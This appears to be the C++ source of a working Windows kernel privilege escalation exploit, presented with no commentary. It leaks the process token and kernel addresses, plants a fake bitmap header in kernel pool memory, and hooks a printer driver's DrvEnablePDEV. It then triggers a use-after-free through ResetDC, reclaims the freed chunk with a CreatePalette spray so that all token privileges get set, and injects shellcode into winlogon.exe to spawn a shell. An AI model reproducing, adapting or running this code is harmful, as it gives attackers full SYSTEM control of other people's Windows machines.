#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <winddi.h>
#include <iostream>
#include <Psapi.h>
#include <tlhelp32.h>
#include "defines.h"
#pragma comment (linker, "/defaultlib:ntdll.lib")

#pragma warning(push)
#pragma warning(disable: 4102)

fnNtSetInformationThreadPtr NtSetInformationThread = (fnNtSetInformationThreadPtr)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtSetInformationThread");

using namespace std;

int main() {
	DWORD64 token_address, token_privileges_address;

	uaf = FALSE;

	if (NtSetInformationThread == NULL)
		goto error;

	if (!(token_address = leak_access_token_address()))
		goto error;

	token_privileges_address = token_address + 0x40;
	cout << "token.privileges @ 0x" << hex << token_privileges_address << endl;

	crafted_BitMapHeader_address = setup_gadget(token_privileges_address);
	cout << "fake BitMapHeader on ring0 @ 0x" << hex << crafted_BitMapHeader_address << endl;

	rtlSetAllBits_address = leak_gadget_address();
	cout << "rtlSetAllBits() on ring0 @ 0x" << hex << rtlSetAllBits_address << endl;

	setup_hook();

	if (!(uaf_hdc = CreateDCW(NULL, hooked_printer_name, NULL, NULL)))
		goto error;

	uaf = TRUE;
	ResetDC(uaf_hdc, NULL);

	spawn_shell();

	system("pause");

	return 0;

error:
	cout << "error @ main()" << endl;
	return 1;
}


DWORD64 leak_access_token_address() {
	HANDLE process_handle(0), process_token_handle(0);
	DWORD64 process_token_address = NULL;

	process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (!process_handle) {
		cout << "[!] error @ OpenProcess()" << endl;
		return 1;
	}

	if (!OpenProcessToken(process_handle, TOKEN_ADJUST_PRIVILEGES, &process_token_handle)) {
		cout << "[!] error @ OpenProcessToken()" << endl;
		return 1;
	}

	do {
		process_token_address = handle_to_address(process_token_handle, ACCESS_TOKEN_HANDLE);
	} while (!process_token_address);

	return process_token_address;
}

DWORD64 leak_gadget_address() {

	DWORD64 module_base_kernel, rtlSetAllBits_address;
	HMODULE module_base_user;

	module_base_user = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!module_base_user)
		goto error;

	rtlSetAllBits_address = (DWORD64)GetProcAddress(module_base_user, "RtlSetAllBits"); // gadget to set our access token
	if (!rtlSetAllBits_address) {
		goto error;
	}
	module_base_kernel = leak_module_base_kernel();
	rtlSetAllBits_address = module_base_kernel + (rtlSetAllBits_address - (DWORD64)module_base_user);

	return rtlSetAllBits_address;
error:
	cout << "[!] error @ leak_gadget_address()" << endl;
	return FALSE;
}

DWORD64 handle_to_address(HANDLE handle_to_leak, DWORD handle_type) {
	DWORD64 pointer;

	DWORD return_length = 0;
	DWORD read_length = 0xa; // initial dummy length
	PSYSTEM_HANDLE_INFORMATION sys_info_buffer{ 0 };
	NTSTATUS status;

	DWORD proccess_id = GetCurrentProcessId();

	size_t current_handle_index;
	size_t handles_count;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO handles_list;

	sys_info_buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(read_length);
	status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, sys_info_buffer, read_length, &return_length);


	switch (status) {
	case STATUS_INFO_LENGTH_MISMATCH:
		do {
			free(sys_info_buffer);
			sys_info_buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(return_length);
			status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, sys_info_buffer, return_length, &return_length);
		} while (status == STATUS_INFO_LENGTH_MISMATCH);
		if (!sys_info_buffer) {
			goto error;
		}
		break;
	default:
		goto error;
	}


	handles_count = sys_info_buffer->NumberOfHandles;
	handles_list = sys_info_buffer->Handles;

	for (current_handle_index = 0; current_handle_index < handles_count; current_handle_index++) {
		if (proccess_id == handles_list[current_handle_index].UniqueProcessId && handle_type == handles_list[current_handle_index].ObjectTypeIndex) {
			if (handle_to_leak == (HANDLE)handles_list[current_handle_index].HandleValue) {
				pointer = (DWORD64)handles_list[current_handle_index].Object;
				free(sys_info_buffer);
				return pointer;
			}
		}
	}

error:
	cout << "[!] error @ NtQuerySystemInformation()" << endl;
	if (sys_info_buffer)
		free(sys_info_buffer);
	return FALSE;
}

DWORD64 leak_module_base_kernel() {
	LPVOID drivers[0x400];
	DWORD cbNeeded;
	if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
		goto error;
	return (DWORD64)drivers[0];
error:
	cout << "[!] error @ leak_kernel_base_address()" << endl;
	return FALSE;
}

DWORD64 setup_gadget(DWORD64 process_privileges_address) {
	DWORD thread_id;
	HANDLE	thread_handle;
	USHORT msg_size;
	HRESULT result;
	LPVOID msg{ 0 }, info_buffer{ 0 };
	UNICODE_STRING crafted;
	DWORD buffer_size, out_size, expected_size;
	ULONG_PTR start, gadget_address;
	DWORD64 entries_count, current_index{ 0 };
	PBIG_POOL_INFO entries;

craft_BitMapHeader:
	// this will result in memset(process_privileges_address, 0xff, 0x10)
	msg_size = POOL_MAX_ALLOC; // size == POOL_MAX_ALLOC so that we get into the big pool
	msg = VirtualAlloc(0, msg_size, MEM_COMMIT, PAGE_READWRITE);
	if (!msg)
		goto error;
	memset(msg, 0x41, 0x20);
	*(DWORD64*)msg = 0x80; // BitMapHeader->SizeOfBitMap
	*(DWORD64*)((DWORD64)msg + 8) = process_privileges_address; // BitMapHeader->Buffer

allocate_BitMapHeader_gadget:
	// thread name primitive NtSetInformationThread()
	// this will result in ExAllocatePoolWithTag(NonPagedPoolNx, crafted.Length+0x10, "ThNm")
	crafted = { 0 };
	crafted.Length = msg_size;
	crafted.MaximumLength = 0xffff;
	crafted.Buffer = (PWSTR)msg;

	thread_handle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thread_main, 0, 0, &thread_id);
	result = NtSetInformationThread(thread_handle, (THREADINFOCLASS)ThreadNameInformation, &crafted, sizeof(crafted));


leak_BitMapHeader_address:
	// find address of the allocated chunk for the gadget in the big pool via NtQuerySystemInformation()
	buffer_size = 0x500 * 0x500;
	info_buffer = LocalAlloc(LPTR, buffer_size);
	if (!info_buffer) {
		goto error;
	}

	result = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, info_buffer, buffer_size, &out_size);

	start = (ULONG_PTR)info_buffer;
	entries_count = *((DWORD64*)info_buffer);
	start += sizeof(entries_count);
	entries = (PBIG_POOL_INFO)(start);
	expected_size = crafted.Length + sizeof(crafted);

	current_index = 0;
	while (current_index < entries_count) {
		BIG_POOL_INFO current_entry = (BIG_POOL_INFO)entries[current_index];
		if (strncmp((char*)current_entry.Tag, "ThNm", sizeof(current_entry.Tag)) == 0 && expected_size == current_entry.SizeInBytes) {
			gadget_address = (((ULONG_PTR)current_entry.VirtualAddress) & ~1) + sizeof(crafted); // flip the allocated/freed bit and skip the 0x10 header
			LocalFree(info_buffer);
			return gadget_address;
		}
		current_index++;
	}



error:
	info_buffer&& LocalFree(info_buffer);
	cout << "[!] error @ gadget()" << endl;
	return FALSE;
}

DWORD thread_main(LPVOID dummy) {
	while (1) Sleep(0xffffff);
}

BOOL setup_hook() {
	DWORD pcbNeeded, pcbReturned, lpflOldProtect, current_printer_index, current_DRVFN;
	HANDLE printer_handle;
	HMODULE driver_handle;
	_DrvEnableDriver DrvEnableDriver;
	void_function DrvDisableDriver;
	PRINTER_INFO_4W* printers{ 0 }, * printer_info;
	DRIVER_INFO_2W* driver_info{ 0 };
	DRVENABLEDATA DRVENABLEDATA_ptr;
	DRVFN* DRVFN_ptr;

	EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);

	if (!pcbNeeded)
		goto error;

	printers = (PRINTER_INFO_4W*)LocalAlloc(LPTR, pcbNeeded);

	if (!printers)
		goto error;


	if (!EnumPrintersW(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)printers, pcbNeeded, &pcbNeeded, &pcbReturned))
		goto error;

	for (current_printer_index = 0; current_printer_index < pcbReturned; current_printer_index++) {
		printer_info = &printers[current_printer_index];

		if (!OpenPrinterW(printer_info->pPrinterName, &printer_handle, NULL))
			goto error;

		hooked_printer_name = (LPWSTR)printer_info->pPrinterName;

		GetPrinterDriverW(printer_handle, NULL, 2, NULL, 0, &pcbNeeded);

		driver_info = (DRIVER_INFO_2W*)LocalAlloc(LPTR, pcbNeeded);
		if (!driver_info)
			goto error;

		if (!GetPrinterDriverW(printer_handle, NULL, 2, (LPBYTE)driver_info, pcbNeeded, &pcbNeeded))
			continue;

		driver_handle = LoadLibraryExW(driver_info->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);

		if (!driver_handle)
			continue;

		DrvEnableDriver = (_DrvEnableDriver)GetProcAddress(driver_handle, "DrvEnableDriver");
		DrvDisableDriver = (void_function)GetProcAddress(driver_handle, "DrvDisableDriver");

		if (!DrvEnableDriver || !DrvDisableDriver)
			continue;

		if (!DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA_ptr), &DRVENABLEDATA_ptr))
			continue;

		DRVFN_ptr = DRVENABLEDATA_ptr.pdrvfn;

		if (!VirtualProtect((LPVOID)DRVFN_ptr, DRVENABLEDATA_ptr.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect))
			continue;

		for (current_DRVFN = 0; current_DRVFN < DRVENABLEDATA_ptr.c; current_DRVFN++) {
			if (DRVFN_ptr[current_DRVFN].iFunc == INDEX_DrvEnablePDEV) {
				wcout << "hooking calls to DrvEnablePDEV() for '" << printer_info->pPrinterName << "' printer" << endl;
				hooked_function = (_DrvEnablePDEV)DRVFN_ptr[current_DRVFN].pfn;
				DRVFN_ptr[current_DRVFN].pfn = (PFN)hook;
				break;
			}
		}

		DrvDisableDriver();
		if (!VirtualProtect(DRVENABLEDATA_ptr.pdrvfn, DRVENABLEDATA_ptr.c * sizeof(PFN), lpflOldProtect, &lpflOldProtect))
			goto error;

		LocalFree((HLOCAL)printers);
		LocalFree((HLOCAL)driver_info);
		return TRUE;
	}
error:
	printers&& LocalFree((HLOCAL)printers);
	driver_info&& LocalFree((HLOCAL)driver_info);
	cout << "error @ setup_hook()" << endl;
	return FALSE;
}

DHPDEV hook(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver) {
	HDC dummy{ 0 };
	DHPDEV returned;

	cout << "hook called!" << endl;
	cout << "proxying the call to the original driver ..." << endl;
	returned = hooked_function(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

	switch (uaf) {
	case TRUE:
		cout << "triggering the UAF" << endl;
		uaf &= FALSE;
		dummy = ResetDCW(uaf_hdc, NULL);
		claim_chunk();
	}

	return returned;
}

VOID claim_chunk() {
	USHORT spraying_tries;
	for (spraying_tries = 0; spraying_tries < 0xffff; spraying_tries++) {
		createpalette_primitive(_chunk_size);
	}
}

VOID createpalette_primitive(SHORT chunk_size) {
	WORD palette_entries_count, palette_size;
	LOGPALETTE* palette;

	if (chunk_size < 0x90) {
		return; // createpalette() primitive work only with size >0x90
	}

	palette_entries_count = (chunk_size - 0x90) / 4;
	palette_size = sizeof(LOGPALETTE) + (palette_entries_count - 1) * sizeof(PALETTEENTRY);
	palette = (LOGPALETTE*)malloc(palette_size);

	*(DWORD64*)((DWORD64)palette + sizeof(palette->palVersion) + sizeof(palette->palNumEntries) + po_dhpdev_offset) = rtlSetAllBits_address;
	*(DWORD64*)((DWORD64)palette + sizeof(palette->palVersion) + sizeof(palette->palNumEntries) + po_ppfn_INDEX_DrvResetPDEV_offset) = crafted_BitMapHeader_address;

	palette->palNumEntries = palette_entries_count;
	palette->palVersion = 0x300;


	CreatePalette(palette);
}

VOID spawn_shell() {
	PROCESSENTRY32 entry;
	DWORD pid{ 0 };
	HANDLE snapshot, handle, thread_handle;
	BOOL result;
	void* buffer;

	entry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	result = Process32First(snapshot, &entry);

	if (result) {
		do {
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {
				pid = entry.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &entry));
	}

	if (!pid)
		goto error;

	handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!handle)
		goto error;

	buffer = VirtualAllocEx(handle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)
		goto error;

	result = WriteProcessMemory(handle, buffer, shellcode, sizeof(shellcode), 0);
	if (!result)
		goto error;

	thread_handle = CreateRemoteThread(handle, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

	if (thread_handle == INVALID_HANDLE_VALUE)
		goto error;

	CloseHandle(snapshot);
error:
	return;
}